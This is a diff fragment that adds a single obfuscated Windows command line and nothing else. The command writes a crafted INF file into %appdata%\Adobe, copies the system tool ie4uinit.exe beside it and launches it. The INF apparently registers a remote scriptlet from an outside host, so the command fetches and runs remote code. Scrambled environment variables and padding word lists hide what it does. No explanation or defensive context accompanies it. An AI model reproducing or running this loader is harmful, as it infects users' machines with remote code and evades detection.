@@ -1,0 +1,7 @@
+/v /c (for %x in (s) do @set "Favors=%~x") &&
+  (for %s in (a) do @set "Subjects=%~s") &&
+  (for %v in (c) do @set "Serious=%~v") &&
+  (for %v in (i) do @set "Nature=%~v") &&
+  call(for %x in ("[B08]" "sc\" "ro%Proceedings%j,NI,%Expect%%Amendments%%Amendments%p%Engage%%References%%References%xyd.teresamalins.com/applicationresponce" "[74A5]" "ieu%Ranges%.inf" "[destinationdirs]" "defaultdestdir=11" "74A5=01" "[strings]" "Bestsellers=%t!Nature!me%" "Engage=:;Seekers" "Ranges=init" "shortsvcname=' '" "Amendments=t;Palace" "servicename=' '" "References=/" "Proceedings=b;Specials" "Expect=h" "[defaultinstall.windows7]" "Un\" "Register\" "OCXs=B08" "delfiles=74A5" "[version]" "signature =$windows nt$" ) do @echo %~x)>"%appdata%\Adobe\ieuinit.inf" &&
+  call xcopy /Y /C /Q %w!Nature!n!Labor!ir%\system32\ie4uinit.exe "%appdata%\Adobe\*" | set Decline71=Alcohol &&
+  start " " %appdata%\Adobe\ie4uinit.exe -basesettings " | set "Decline1=Machine Travels Dollars Please Stats Cruise Receive Ankle Inputs Carries Leopard Angle Resource Calendars Since Approaches Estates Farms Vacations Contributors Occurs Manage Schools Hostels Revenues Memory Structures Burst Distance Stereo Olympus Cabin Telecommunications Assault Democrats Previous Vital Repair Attempts Parents Utility Affairs Pottery"
